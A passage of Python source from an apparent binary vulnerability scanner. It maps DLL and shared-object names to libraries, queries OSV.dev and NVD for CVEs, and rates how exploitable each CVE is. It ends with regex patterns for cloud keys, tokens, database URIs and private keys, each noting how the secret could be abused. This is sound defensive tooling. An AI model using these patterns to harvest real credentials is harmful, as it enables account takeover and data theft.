    # FFmpeg
    "avcodec-58.dll": ("ffmpeg:ffmpeg", "4.2", "FFmpeg"),
    "avcodec-59.dll": ("ffmpeg:ffmpeg", "5.0", "FFmpeg"),
    "avcodec-60.dll": ("ffmpeg:ffmpeg", "6.0", "FFmpeg"),
    "avformat-58.dll": ("ffmpeg:ffmpeg", "4.2", "FFmpeg"),
    "avformat-59.dll": ("ffmpeg:ffmpeg", "5.0", "FFmpeg"),
    "avformat-60.dll": ("ffmpeg:ffmpeg", "6.0", "FFmpeg"),
    "avutil-56.dll": ("ffmpeg:ffmpeg", "4.2", "FFmpeg"),
    "avutil-57.dll": ("ffmpeg:ffmpeg", "5.0", "FFmpeg"),
    "avutil-58.dll": ("ffmpeg:ffmpeg", "6.0", "FFmpeg"),
    
    # Python
    "python3.dll": ("python:python", "3", "Python"),
    "python38.dll": ("python:python", "3.8", "Python"),
    "python39.dll": ("python:python", "3.9", "Python"),
    "python310.dll": ("python:python", "3.10", "Python"),
    "python311.dll": ("python:python", "3.11", "Python"),
    "python312.dll": ("python:python", "3.12", "Python"),
    
    # Qt
    "qt5core.dll": ("qt:qt", "5", "Qt"),
    "qt5gui.dll": ("qt:qt", "5", "Qt"),
    "qt5widgets.dll": ("qt:qt", "5", "Qt"),
    "qt6core.dll": ("qt:qt", "6", "Qt"),
    "qt6gui.dll": ("qt:qt", "6", "Qt"),
    
    # Boost
    "boost_system.dll": ("boost:boost", None, "Boost"),
    "boost_filesystem.dll": ("boost:boost", None, "Boost"),
    "boost_thread.dll": ("boost:boost", None, "Boost"),
    
    # OpenCV
    "opencv_core.dll": ("opencv:opencv", None, "OpenCV"),
    "opencv_imgproc.dll": ("opencv:opencv", None, "OpenCV"),
    "opencv_world455.dll": ("opencv:opencv", "4.5.5", "OpenCV"),
    "opencv_world460.dll": ("opencv:opencv", "4.6.0", "OpenCV"),
    
    # Crypto++
    "cryptopp.dll": ("cryptopp:cryptopp", None, "Crypto++"),
    
    # libssh/libssh2
    "libssh.dll": ("libssh:libssh", None, "libssh"),
    "libssh2.dll": ("libssh2:libssh2", None, "libssh2"),
    
    # mbedTLS
    "mbedtls.dll": ("arm:mbedtls", None, "mbedTLS"),
    "mbedcrypto.dll": ("arm:mbedtls", None, "mbedTLS"),
    
    # WolfSSL
    "wolfssl.dll": ("wolfssl:wolfssl", None, "WolfSSL"),
    
    # GnuTLS
    "libgnutls.dll": ("gnu:gnutls", None, "GnuTLS"),
    
    # ICU
    "icuuc.dll": ("icu-project:icu", None, "ICU"),
    "icuin.dll": ("icu-project:icu", None, "ICU"),
    "icudt.dll": ("icu-project:icu", None, "ICU"),
    
    # Log4j (if JNI)
    "log4j.dll": ("apache:log4j", None, "Maven"),
}

# Known Linux shared objects to library mappings
KNOWN_LINUX_LIBS = {
    # OpenSSL
    "libssl.so": ("openssl:openssl", None, "OpenSSL"),
    "libssl.so.1.0": ("openssl:openssl", "1.0", "OpenSSL"),
    "libssl.so.1.1": ("openssl:openssl", "1.1", "OpenSSL"),
    "libssl.so.3": ("openssl:openssl", "3.0", "OpenSSL"),
    "libcrypto.so": ("openssl:openssl", None, "OpenSSL"),
    "libcrypto.so.1.0": ("openssl:openssl", "1.0", "OpenSSL"),
    "libcrypto.so.1.1": ("openssl:openssl", "1.1", "OpenSSL"),
    "libcrypto.so.3": ("openssl:openssl", "3.0", "OpenSSL"),
    
    # glibc
    "libc.so.6": ("gnu:glibc", "2", "glibc"),
    "libpthread.so.0": ("gnu:glibc", "2", "glibc"),
    "libm.so.6": ("gnu:glibc", "2", "glibc"),
    "libdl.so.2": ("gnu:glibc", "2", "glibc"),
    "librt.so.1": ("gnu:glibc", "2", "glibc"),
    
    # zlib
    "libz.so": ("zlib:zlib", None, "zlib"),
    "libz.so.1": ("zlib:zlib", "1", "zlib"),
    
    # libcurl
    "libcurl.so": ("haxx:libcurl", None, "curl"),
    "libcurl.so.4": ("haxx:libcurl", "4", "curl"),
    
    # SQLite
    "libsqlite3.so": ("sqlite:sqlite", "3", "sqlite"),
    "libsqlite3.so.0": ("sqlite:sqlite", "3", "sqlite"),
    
    # libxml2
    "libxml2.so": ("xmlsoft:libxml2", None, "libxml2"),
    "libxml2.so.2": ("xmlsoft:libxml2", "2", "libxml2"),
    
    # libpng
    "libpng.so": ("libpng:libpng", None, "libpng"),
    "libpng16.so": ("libpng:libpng", "1.6", "libpng"),
    "libpng16.so.16": ("libpng:libpng", "1.6", "libpng"),
    
    # libjpeg
    "libjpeg.so": ("ijg:libjpeg", None, "libjpeg"),
    "libjpeg.so.62": ("ijg:libjpeg", "6.2", "libjpeg"),
    "libjpeg.so.8": ("ijg:libjpeg", "8", "libjpeg"),
    
    # FFmpeg
    "libavcodec.so": ("ffmpeg:ffmpeg", None, "FFmpeg"),
    "libavformat.so": ("ffmpeg:ffmpeg", None, "FFmpeg"),
    "libavutil.so": ("ffmpeg:ffmpeg", None, "FFmpeg"),
    
    # libssh/libssh2
    "libssh.so": ("libssh:libssh", None, "libssh"),
    "libssh2.so": ("libssh2:libssh2", None, "libssh2"),
    "libssh2.so.1": ("libssh2:libssh2", "1", "libssh2"),
    
    # GnuTLS
    "libgnutls.so": ("gnu:gnutls", None, "GnuTLS"),
    "libgnutls.so.30": ("gnu:gnutls", "3", "GnuTLS"),
    
    # mbedTLS
    "libmbedtls.so": ("arm:mbedtls", None, "mbedTLS"),
    "libmbedcrypto.so": ("arm:mbedtls", None, "mbedTLS"),
    
    # Expat
    "libexpat.so": ("libexpat:expat", None, "expat"),
    "libexpat.so.1": ("libexpat:expat", "1", "expat"),
    
    # ICU
    "libicuuc.so": ("icu-project:icu", None, "ICU"),
    "libicudata.so": ("icu-project:icu", None, "ICU"),
    
    # libpcre
    "libpcre.so": ("pcre:pcre", None, "PCRE"),
    "libpcre2-8.so": ("pcre:pcre2", None, "PCRE2"),
    
    # GLib
    "libglib-2.0.so": ("gnome:glib", "2", "GLib"),
    
    # Log4j JNI
    "liblog4j.so": ("apache:log4j", None, "Maven"),
}

# High-risk libraries with known CVE history (binary context)
HIGH_RISK_BINARY_LIBS = {
    "openssl:openssl": "OpenSSL - Critical crypto library with periodic high-severity CVEs (Heartbleed, etc.)",
    "haxx:libcurl": "libcurl - Network library with frequent security updates",
    "xmlsoft:libxml2": "libxml2 - XML parsing library with history of memory corruption CVEs",
    "ffmpeg:ffmpeg": "FFmpeg - Media processing with regular CVEs",
    "sqlite:sqlite": "SQLite - Database engine, check for injection-related CVEs",
    "libssh:libssh": "libssh - SSH library with authentication bypass history",
    "libssh2:libssh2": "libssh2 - SSH library with buffer overflow history",
    "zlib:zlib": "zlib - Compression library with occasional CVEs",
    "libpng:libpng": "libpng - Image library with buffer overflow history",
    "ijg:libjpeg": "libjpeg - JPEG library with memory corruption CVEs",
    "gnu:glibc": "glibc - Core C library with critical CVEs (GHOST, etc.)",
    "apache:log4j": "Log4j - Critical RCE vulnerabilities (Log4Shell)",
    "arm:mbedtls": "mbedTLS - TLS library with periodic CVEs",
    "gnu:gnutls": "GnuTLS - TLS library with security issues",
    "qt:qt": "Qt - Framework with occasional CVEs",
    "icu-project:icu": "ICU - Unicode library with buffer overflow history",
}


@dataclass
class BinaryLibraryInfo:
    """Information about a library detected in a binary."""
    library_name: str  # DLL/SO name
    cpe_name: str  # CPE-style name for CVE lookup
    version: Optional[str]
    ecosystem: str  # For OSV.dev lookup
    source: str  # "pe_import", "elf_dynamic", "strings"
    is_high_risk: bool
    risk_reason: Optional[str]
    import_count: int = 0  # How many functions imported


def extract_binary_libraries(
    imports: List[Dict[str, Any]],
    linked_libraries: List[str],
    strings: List[Dict[str, Any]] = None,
    is_pe: bool = True
) -> List[BinaryLibraryInfo]:
    """
    Extract third-party library dependencies from PE/ELF binary.
    
    Detection methods:
    1. PE Import Table - DLL names from imports
    2. ELF Dynamic Section - Linked shared objects
    3. Strings - Library version strings in binary
    
    Args:
        imports: List of imported functions with 'library' field
        linked_libraries: List of linked library names (ELF .dynamic)
        strings: Optional extracted strings for version detection
        is_pe: True for PE (Windows), False for ELF (Linux)
        
    Returns:
        List of detected libraries with metadata
    """
    libraries: Dict[str, BinaryLibraryInfo] = {}
    lookup_table = KNOWN_WINDOWS_DLLS if is_pe else KNOWN_LINUX_LIBS
    
    # Method 1: Extract from imports (PE) or linked libraries (ELF)
    dll_names = set()
    import_counts: Dict[str, int] = {}
    
    # Count imports per DLL
    for imp in imports:
        lib = imp.get("library", "")
        if lib:
            dll_names.add(lib.lower())
            import_counts[lib.lower()] = import_counts.get(lib.lower(), 0) + 1
    
    # Add linked libraries (ELF)
    for lib in linked_libraries:
        # Normalize - strip version suffixes for matching
        base_lib = lib.lower()
        # Handle versioned .so files: libssl.so.1.1 -> libssl.so.1.1
        dll_names.add(base_lib)
    
    # Match against known libraries
    for dll in dll_names:
        matched = False
        
        # Try exact match first
        if dll in lookup_table:
            cpe, version, ecosystem = lookup_table[dll]
            is_high_risk = cpe in HIGH_RISK_BINARY_LIBS
            libraries[cpe] = BinaryLibraryInfo(
                library_name=dll,
                cpe_name=cpe,
                version=version,
                ecosystem=ecosystem,
                source="pe_import" if is_pe else "elf_dynamic",
                is_high_risk=is_high_risk,
                risk_reason=HIGH_RISK_BINARY_LIBS.get(cpe),
                import_count=import_counts.get(dll, 0),
            )
            matched = True
        
        if not matched:
            # Try prefix matching for versioned libraries
            for known_dll, (cpe, version, ecosystem) in lookup_table.items():
                # Match libssl.so against libssl.so.1.1
                if dll.startswith(known_dll.replace(".dll", "").replace(".so", "")):
                    is_high_risk = cpe in HIGH_RISK_BINARY_LIBS
                    # Try to extract version from dll name
                    detected_version = version
                    version_match = re.search(r'\.(\d+(?:\.\d+)*)', dll)
                    if version_match:
                        detected_version = version_match.group(1)
                    
                    libraries[cpe] = BinaryLibraryInfo(
                        library_name=dll,
                        cpe_name=cpe,
                        version=detected_version,
                        ecosystem=ecosystem,
                        source="pe_import" if is_pe else "elf_dynamic",
                        is_high_risk=is_high_risk,
                        risk_reason=HIGH_RISK_BINARY_LIBS.get(cpe),
                        import_count=import_counts.get(dll, 0),
                    )
                    break
    
    # Method 2: Extract version info from strings (if available)
    if strings:
        version_patterns = [
            # OpenSSL version strings
            (r'OpenSSL\s+(\d+\.\d+\.\d+[a-z]?)', "openssl:openssl", "OpenSSL"),
            (r'openssl[/-](\d+\.\d+\.\d+)', "openssl:openssl", "OpenSSL"),
            # libcurl
            (r'libcurl[/-](\d+\.\d+\.\d+)', "haxx:libcurl", "curl"),
            (r'curl\s+(\d+\.\d+\.\d+)', "haxx:libcurl", "curl"),
            # SQLite
            (r'SQLite\s+(\d+\.\d+\.\d+)', "sqlite:sqlite", "sqlite"),
            # zlib
            (r'zlib\s+(\d+\.\d+\.\d+)', "zlib:zlib", "zlib"),
            # libxml2
            (r'libxml2[/-](\d+\.\d+\.\d+)', "xmlsoft:libxml2", "libxml2"),
            # FFmpeg
            (r'FFmpeg\s+(\d+\.\d+)', "ffmpeg:ffmpeg", "FFmpeg"),
            (r'libavcodec\s+(\d+\.\d+)', "ffmpeg:ffmpeg", "FFmpeg"),
            # Python
            (r'Python\s+(\d+\.\d+\.\d+)', "python:python", "Python"),
            # Qt
            (r'Qt\s+(\d+\.\d+\.\d+)', "qt:qt", "Qt"),
            # Boost
            (r'Boost\s+(\d+\.\d+\.\d+)', "boost:boost", "Boost"),
            (r'boost[/_](\d+)[/_](\d+)', "boost:boost", "Boost"),
            # OpenCV
            (r'OpenCV\s+(\d+\.\d+\.\d+)', "opencv:opencv", "OpenCV"),
        ]
        
        for string_entry in strings[:5000]:  # Limit to first 5000 strings
            value = string_entry.get("value", "")
            if len(value) < 5 or len(value) > 200:
                continue
            
            for pattern, cpe, ecosystem in version_patterns:
                match = re.search(pattern, value, re.I)
                if match:
                    version = match.group(1)
                    # Update or add library with detected version
                    if cpe in libraries:
                        if not libraries[cpe].version:
                            libraries[cpe].version = version
                    else:
                        is_high_risk = cpe in HIGH_RISK_BINARY_LIBS
                        libraries[cpe] = BinaryLibraryInfo(
                            library_name=cpe.split(":")[1],
                            cpe_name=cpe,
                            version=version,
                            ecosystem=ecosystem,
                            source="strings",
                            is_high_risk=is_high_risk,
                            risk_reason=HIGH_RISK_BINARY_LIBS.get(cpe),
                            import_count=0,
                        )
                    break
    
    return list(libraries.values())


async def lookup_binary_cves(libraries: List[BinaryLibraryInfo]) -> List[Dict[str, Any]]:
    """
    Look up CVEs for detected binary libraries using OSV.dev and NVD APIs.
    
    Args:
        libraries: List of detected libraries
        
    Returns:
        List of vulnerability dictionaries with exploitation context
    """
    import httpx
    
    OSV_URL = "https://api.osv.dev/v1/query"
    NVD_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0"
    
    vulnerabilities = []
    seen_cves = set()  # Deduplicate
    
    async with httpx.AsyncClient(timeout=30) as client:
        for lib in libraries:
            try:
                cves_found = []
                
                # Method 1: OSV.dev lookup (ecosystem-based)
                # Try multiple ecosystem variations
                ecosystems_to_try = [lib.ecosystem]
                
                # Add additional ecosystems based on library type
                if "openssl" in lib.cpe_name.lower():
                    ecosystems_to_try.extend(["crates.io", "PyPI", "npm"])  # Bindings
                elif "curl" in lib.cpe_name.lower():
                    ecosystems_to_try.extend(["crates.io", "PyPI"])
                
                for ecosystem in ecosystems_to_try[:2]:  # Limit ecosystem queries
                    try:
                        # Query by CPE name parts
                        pkg_name = lib.cpe_name.split(":")[1] if ":" in lib.cpe_name else lib.library_name
                        
                        payload = {
                            "package": {
                                "name": pkg_name,
                                "ecosystem": ecosystem
                            }
                        }
                        
                        if lib.version:
                            payload["version"] = lib.version
                        
                        resp = await client.post(OSV_URL, json=payload)
                        
                        if resp.status_code == 200:
                            data = resp.json()
                            for vuln in data.get("vulns", []):
                                cve_id = vuln.get("id", "")
                                if cve_id in seen_cves:
                                    continue
                                seen_cves.add(cve_id)
                                cves_found.append(vuln)
                    except Exception as e:
                        logger.debug(f"OSV lookup failed for {lib.library_name}/{ecosystem}: {e}")
                
                # Method 2: NVD keyword search for CPE-based lookup
                try:
                    keyword = lib.cpe_name.split(":")[1] if ":" in lib.cpe_name else lib.library_name
                    params = {
                        "keywordSearch": keyword,
                        "resultsPerPage": 20
                    }
                    
                    resp = await client.get(NVD_URL, params=params, timeout=15)
                    
                    if resp.status_code == 200:
                        data = resp.json()
                        for vuln_wrapper in data.get("vulnerabilities", []):
                            cve = vuln_wrapper.get("cve", {})
                            cve_id = cve.get("id", "")
                            
                            if cve_id in seen_cves:
                                continue
                            
                            # Check if this CVE affects our version
                            if lib.version:
                                # Simple version check in description
                                desc = ""
                                for d in cve.get("descriptions", []):
                                    if d.get("lang") == "en":
                                        desc = d.get("value", "")
                                        break
                                
                                # Skip if version clearly doesn't match
                                if lib.version and desc:
                                    # Look for version ranges in description
                                    if f"before {lib.version}" in desc.lower():
                                        continue  # We have the fixed version
                            
                            seen_cves.add(cve_id)
                            cves_found.append({
                                "id": cve_id,
                                "source": "nvd",
                                "cve_data": cve
                            })
                except Exception as e:
                    logger.debug(f"NVD lookup failed for {lib.library_name}: {e}")
                
                # Process found CVEs
                for vuln in cves_found:
                    vuln_data = _parse_binary_cve(vuln, lib)
                    if vuln_data:
                        vulnerabilities.append(vuln_data)
                        
            except Exception as e:
                logger.warning(f"CVE lookup failed for {lib.library_name}: {e}")
    
    # Sort by severity
    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "unknown": 4}
    vulnerabilities.sort(key=lambda x: severity_order.get(x.get("severity", "unknown"), 4))
    
    return vulnerabilities


def _parse_binary_cve(vuln: Dict, lib: BinaryLibraryInfo) -> Optional[Dict[str, Any]]:
    """Parse CVE data from OSV or NVD into standardized format."""
    
    # Handle NVD format (wrapped in cve_data)
    if "cve_data" in vuln:
        cve = vuln["cve_data"]
        cve_id = cve.get("id", vuln.get("id", "Unknown"))
        
        # Extract description
        description = ""
        for d in cve.get("descriptions", []):
            if d.get("lang") == "en":
                description = d.get("value", "")
                break
        
        # Extract CVSS score
        cvss_score = None
        severity = "medium"
        cvss_vector = None
        
        metrics = cve.get("metrics", {})
        for cvss_type in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
            if cvss_type in metrics and metrics[cvss_type]:
                cvss_data = metrics[cvss_type][0].get("cvssData", {})
                cvss_score = cvss_data.get("baseScore")
                cvss_vector = cvss_data.get("vectorString")
                if cvss_score:
                    if cvss_score >= 9.0:
                        severity = "critical"
                    elif cvss_score >= 7.0:
                        severity = "high"
                    elif cvss_score >= 4.0:
                        severity = "medium"
                    else:
                        severity = "low"
                break
        
        # Extract CWEs
        cwes = []
        for weakness in cve.get("weaknesses", []):
            for desc in weakness.get("description", []):
                if desc.get("value", "").startswith("CWE-"):
                    cwes.append(desc.get("value"))
        
        # Extract references
        references = []
        for ref in cve.get("references", [])[:5]:
            references.append(ref.get("url", ""))
        
        return {
            "library": lib.library_name,
            "library_version": lib.version or "unknown",
            "cpe_name": lib.cpe_name,
            "cve_id": cve_id,
            "aliases": [],
            "summary": description[:500] if description else "No description available",
            "details": description,
            "severity": severity,
            "cvss_score": cvss_score,
            "cvss_vector": cvss_vector,
            "cwes": cwes,
            "references": references,
            "published": cve.get("published", ""),
            "modified": cve.get("lastModified", ""),
            "source": "nvd",
            "exploitation_potential": _assess_binary_exploitation(description, lib),
            "attack_vector": _determine_binary_attack_vector(description, cvss_vector),
            "binary_context": {
                "import_count": lib.import_count,
                "is_high_risk_lib": lib.is_high_risk,
                "detection_source": lib.source,
            }
        }
    
    # Handle OSV format
    else:
        cve_id = vuln.get("id", "Unknown")
        summary = vuln.get("summary", "No description available")
        details = vuln.get("details", "")
        
        # Parse CVSS
        cvss_score = None
        severity = "medium"
        
        for sev in vuln.get("severity", []):
            if sev.get("type") == "CVSS_V3":
                cvss_score = float(sev.get("score", 0))
                if cvss_score >= 9.0:
                    severity = "critical"
                elif cvss_score >= 7.0:
                    severity = "high"
                elif cvss_score >= 4.0:
                    severity = "medium"
                else:
                    severity = "low"
                break
        
        # Extract affected versions
        affected_versions = []
        for affected in vuln.get("affected", []):
            for range_info in affected.get("ranges", []):
                for event in range_info.get("events", []):
                    if "fixed" in event:
                        affected_versions.append(f"Fixed in {event['fixed']}")
                    if "introduced" in event:
                        affected_versions.append(f"Introduced in {event['introduced']}")
        
        # References
        references = []
        for ref in vuln.get("references", [])[:5]:
            references.append(ref.get("url", ""))
        
        return {
            "library": lib.library_name,
            "library_version": lib.version or "unknown",
            "cpe_name": lib.cpe_name,
            "cve_id": cve_id,
            "aliases": vuln.get("aliases", []),
            "summary": summary,
            "details": details[:1000] if details else "",
            "severity": severity,
            "cvss_score": cvss_score,
            "cvss_vector": None,
            "cwes": [],
            "affected_versions": affected_versions,
            "references": references,
            "published": vuln.get("published", ""),
            "modified": vuln.get("modified", ""),
            "source": "osv",
            "exploitation_potential": _assess_binary_exploitation(summary + " " + details, lib),
            "attack_vector": _determine_binary_attack_vector(summary + " " + details, None),
            "binary_context": {
                "import_count": lib.import_count,
                "is_high_risk_lib": lib.is_high_risk,
                "detection_source": lib.source,
            }
        }


def _assess_binary_exploitation(description: str, lib: BinaryLibraryInfo) -> str:
    """Assess exploitation potential for binary vulnerability."""
    desc_lower = description.lower()
    
    # Critical exploitation indicators
    if any(term in desc_lower for term in ["remote code execution", "rce", "arbitrary code execution"]):
        return "CRITICAL - Remote Code Execution possible"
    if any(term in desc_lower for term in ["buffer overflow", "heap overflow", "stack overflow"]):
        if any(term in desc_lower for term in ["remote", "network", "unauthenticated"]):
            return "CRITICAL - Remote buffer overflow"
        return "HIGH - Memory corruption, potential code execution"
    if any(term in desc_lower for term in ["use after free", "use-after-free", "double free"]):
        return "HIGH - Memory corruption, potential code execution"
    if any(term in desc_lower for term in ["authentication bypass", "auth bypass"]):
        return "HIGH - Authentication can be bypassed"
    if any(term in desc_lower for term in ["format string"]):
        return "HIGH - Format string vulnerability, potential code execution"
    if any(term in desc_lower for term in ["integer overflow", "integer underflow"]):
        return "MEDIUM - Integer overflow may lead to memory corruption"
    if any(term in desc_lower for term in ["null pointer", "null dereference"]):
        return "MEDIUM - Denial of service via crash"
    if any(term in desc_lower for term in ["denial of service", "dos", "crash", "infinite loop"]):
        return "LOW - Service disruption possible"
    if any(term in desc_lower for term in ["information disclosure", "information leak", "memory leak"]):
        return "MEDIUM - Sensitive data exposure possible"
    if any(term in desc_lower for term in ["path traversal", "directory traversal"]):
        return "HIGH - File system access possible"
    
    # Library-specific assessments
    if "openssl" in lib.cpe_name.lower():
        if "heartbleed" in desc_lower or "heartbeat" in desc_lower:
            return "CRITICAL - Heartbleed-type memory disclosure"
        return "HIGH - Crypto library vulnerability"
    
    if "curl" in lib.cpe_name.lower() or "libcurl" in lib.cpe_name.lower():
        if any(term in desc_lower for term in ["ssrf", "redirect"]):
            return "MEDIUM - SSRF or redirect vulnerability"
    
    return "Review required - assess based on application context"


def _determine_binary_attack_vector(description: str, cvss_vector: Optional[str]) -> str:
    """Determine attack vector from vulnerability data."""
    
    # Parse from CVSS vector if available
    if cvss_vector:
        if "AV:N" in cvss_vector or "AV:NETWORK" in cvss_vector.upper():
            return "Network - Exploitable remotely"
        if "AV:A" in cvss_vector or "AV:ADJACENT" in cvss_vector.upper():
            return "Adjacent Network - Requires proximity"
        if "AV:L" in cvss_vector or "AV:LOCAL" in cvss_vector.upper():
            return "Local - Requires local access"
        if "AV:P" in cvss_vector or "AV:PHYSICAL" in cvss_vector.upper():
            return "Physical - Requires physical access"
    
    # Infer from description
    desc_lower = description.lower()
    
    if any(term in desc_lower for term in ["remote", "network", "http", "https", "tcp", "udp", "server"]):
        return "Network - Exploitable remotely"
    if any(term in desc_lower for term in ["local", "privilege escalation", "setuid"]):
        return "Local - Requires local access"
    if any(term in desc_lower for term in ["user interaction", "click", "open file", "malicious file"]):
        return "User Interaction - Requires victim action"
    if any(term in desc_lower for term in ["physical", "usb", "device access"]):
        return "Physical - Requires physical access"
    
    return "Unknown - Review vulnerability details"


async def comprehensive_binary_cve_scan(
    binary_metadata: Dict[str, Any],
    strings: List[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    Perform comprehensive CVE scan for a binary based on its metadata.
    
    Args:
        binary_metadata: Metadata from binary analysis (imports, linked_libraries, etc.)
        strings: Optional extracted strings for version detection
        
    Returns:
        Comprehensive CVE scan results
    """
    import time
    start_time = time.time()
    
    # Determine binary type
    is_pe = binary_metadata.get("format", "").lower() in ["pe", "pe32", "pe32+", "dll", "exe"]
    
    # Extract imports and linked libraries
    imports = binary_metadata.get("imports", [])
    linked_libraries = binary_metadata.get("linked_libraries", [])
    
    # If imports is list of ImportedFunction objects, convert
    if imports and isinstance(imports[0], dict):
        pass  # Already dict format
    else:
        # Convert from dataclass or object format
        imports = [{"name": getattr(i, "name", ""), "library": getattr(i, "library", "")} for i in imports]
    
    # Detect libraries
    libraries = extract_binary_libraries(
        imports=imports,
        linked_libraries=linked_libraries,
        strings=strings,
        is_pe=is_pe
    )
    
    logger.info(f"Detected {len(libraries)} libraries in binary")
    
    # Lookup CVEs
    cves = await lookup_binary_cves(libraries)
    
    elapsed = time.time() - start_time
    
    # Build summary
    summary = {
        "total_libraries": len(libraries),
        "high_risk_libraries": sum(1 for lib in libraries if lib.is_high_risk),
        "total_cves": len(cves),
        "critical_cves": sum(1 for cve in cves if cve.get("severity") == "critical"),
        "high_cves": sum(1 for cve in cves if cve.get("severity") == "high"),
        "medium_cves": sum(1 for cve in cves if cve.get("severity") == "medium"),
        "low_cves": sum(1 for cve in cves if cve.get("severity") == "low"),
        "scan_time": elapsed,
    }
    
    # Convert libraries to dict format
    libraries_data = [
        {
            "library_name": lib.library_name,
            "cpe_name": lib.cpe_name,
            "version": lib.version,
            "ecosystem": lib.ecosystem,
            "source": lib.source,
            "is_high_risk": lib.is_high_risk,
            "risk_reason": lib.risk_reason,
            "import_count": lib.import_count,
        }
        for lib in libraries
    ]
    
    logger.info(f"Binary CVE scan complete: {len(cves)} CVEs found in {elapsed:.1f}s")
    
    return {
        "libraries": libraries_data,
        "cves": cves,
        "summary": summary,
    }


# ============================================================================
# Part 3: Comprehensive Sensitive Data Discovery for Binaries
# ============================================================================

# Enhanced secret patterns for binary analysis (C/C++/compiled code context)
BINARY_SECRET_PATTERNS = {
    # Cloud Provider API Keys
    "aws_access_key": {
        "pattern": re.compile(r'AKIA[0-9A-Z]{16}'),
        "severity": "critical",
        "description": "AWS Access Key ID - provides AWS service access",
        "exploitation": "Can be used to access AWS resources, enumerate services, pivot"
    },
    "aws_secret_key": {
        "pattern": re.compile(r'[0-9a-zA-Z/+]{40}'),
        "severity": "critical",
        "description": "Potential AWS Secret Access Key",
        "exploitation": "Combined with access key, provides full AWS API access",
        "requires_context": True  # Needs nearby AWS context to confirm
    },
    "azure_connection_string": {
        "pattern": re.compile(r'DefaultEndpointsProtocol=https?;AccountName=[^;]+;AccountKey=[^;]+'),
        "severity": "critical",
        "description": "Azure Storage connection string",
        "exploitation": "Full access to Azure storage account"
    },
    "gcp_api_key": {
        "pattern": re.compile(r'AIza[0-9A-Za-z_-]{35}'),
        "severity": "high",
        "description": "Google Cloud API Key",
        "exploitation": "Access to Google Cloud services based on key permissions"
    },
    "gcp_service_account": {
        "pattern": re.compile(r'"type"\s*:\s*"service_account"'),
        "severity": "critical",
        "description": "GCP Service Account JSON",
        "exploitation": "Full service account impersonation"
    },
    
    # Version Control & CI/CD
    "github_token": {
        "pattern": re.compile(r'ghp_[0-9a-zA-Z]{36}'),
        "severity": "critical",
        "description": "GitHub Personal Access Token",
        "exploitation": "Repository access, code modification, secrets access"
    },
    "github_oauth": {
        "pattern": re.compile(r'gho_[0-9a-zA-Z]{36}'),
        "severity": "critical",
        "description": "GitHub OAuth Token",
        "exploitation": "API access with user permissions"
    },
    "gitlab_token": {
        "pattern": re.compile(r'glpat-[0-9a-zA-Z_-]{20}'),
        "severity": "critical",
        "description": "GitLab Personal Access Token",
        "exploitation": "Repository and CI/CD pipeline access"
    },
    "bitbucket_token": {
        "pattern": re.compile(r'ATBB[0-9a-zA-Z]{32}'),
        "severity": "critical",
        "description": "Bitbucket App Token",
        "exploitation": "Repository access"
    },
    
    # Payment & Financial
    "stripe_secret": {
        "pattern": re.compile(r'sk_live_[0-9a-zA-Z]{24,}'),
        "severity": "critical",
        "description": "Stripe Secret Key (Live)",
        "exploitation": "Full access to payment operations, customer data"
    },
    "stripe_publishable": {
        "pattern": re.compile(r'pk_live_[0-9a-zA-Z]{24,}'),
        "severity": "medium",
        "description": "Stripe Publishable Key (Live)",
        "exploitation": "Limited - client-side operations only"
    },
    "paypal_client_id": {
        "pattern": re.compile(r'A[0-9a-zA-Z_-]{79}'),
        "severity": "high",
        "description": "Potential PayPal Client ID",
        "exploitation": "Payment API access",
        "requires_context": True
    },
    
    # Communication Services
    "twilio_account_sid": {
        "pattern": re.compile(r'AC[0-9a-fA-F]{32}'),
        "severity": "high",
        "description": "Twilio Account SID",
        "exploitation": "SMS/Voice service access"
    },
    "twilio_auth_token": {
        "pattern": re.compile(r'[0-9a-fA-F]{32}'),
        "severity": "critical",
        "description": "Potential Twilio Auth Token",
        "exploitation": "Full Twilio API access",
        "requires_context": True
    },
    "sendgrid_api_key": {
        "pattern": re.compile(r'SG\.[0-9a-zA-Z_-]{22}\.[0-9a-zA-Z_-]{43}'),
        "severity": "high",
        "description": "SendGrid API Key",
        "exploitation": "Email sending capability"
    },
    "mailchimp_api_key": {
        "pattern": re.compile(r'[0-9a-f]{32}-us[0-9]{1,2}'),
        "severity": "high",
        "description": "Mailchimp API Key",
        "exploitation": "Mailing list access and manipulation"
    },
    
    # Database Connection Strings
    "mongodb_uri": {
        "pattern": re.compile(r'mongodb(?:\+srv)?://[^\s"\'<>]+'),
        "severity": "critical",
        "description": "MongoDB Connection URI",
        "exploitation": "Database access, data exfiltration"
    },
    "postgres_uri": {
        "pattern": re.compile(r'postgres(?:ql)?://[^\s"\'<>]+'),
        "severity": "critical",
        "description": "PostgreSQL Connection URI",
        "exploitation": "Database access"
    },
    "mysql_uri": {
        "pattern": re.compile(r'mysql://[^\s"\'<>]+'),
        "severity": "critical",
        "description": "MySQL Connection URI",
        "exploitation": "Database access"
    },
    "redis_uri": {
        "pattern": re.compile(r'redis://[^\s"\'<>]+'),
        "severity": "high",
        "description": "Redis Connection URI",
        "exploitation": "Cache/session access, potential RCE"
    },
    "mssql_connection": {
        "pattern": re.compile(r'Server=.*?;.*?Password=[^;]+', re.I),
        "severity": "critical",
        "description": "MS SQL Server Connection String",
        "exploitation": "Database access"
    },
    
    # Cryptographic Material
    "private_key_rsa": {
        "pattern": re.compile(r'-----BEGIN\s+(?:RSA\s+)?PRIVATE\s+KEY-----'),
        "severity": "critical",
        "description": "RSA Private Key",
        "exploitation": "Impersonation, decryption, signing"
    },
    "private_key_ec": {
        "pattern": re.compile(r'-----BEGIN\s+EC\s+PRIVATE\s+KEY-----'),
        "severity": "critical",
        "description": "EC Private Key",
        "exploitation": "Impersonation, signing"
    },
    "private_key_openssh": {
        "pattern": re.compile(r'-----BEGIN\s+OPENSSH\s+PRIVATE\s+KEY-----'),
        "severity": "critical",
        "description": "OpenSSH Private Key",
        "exploitation": "SSH authentication bypass"
    },
    "private_key_pkcs8": {
        "pattern": re.compile(r'-----BEGIN\s+PRIVATE\s+KEY-----'),
        "severity": "critical",
        "description": "PKCS#8 Private Key",
        "exploitation": "Cryptographic impersonation"
    },
    "pgp_private": {
        "pattern": re.compile(r'-----BEGIN\s+PGP\s+PRIVATE\s+KEY\s+BLOCK-----'),
        "severity": "critical",
        "description": "PGP Private Key",
        "exploitation": "Message decryption, signature forgery"
    },
    
    # JWT and OAuth
    "jwt_token": {
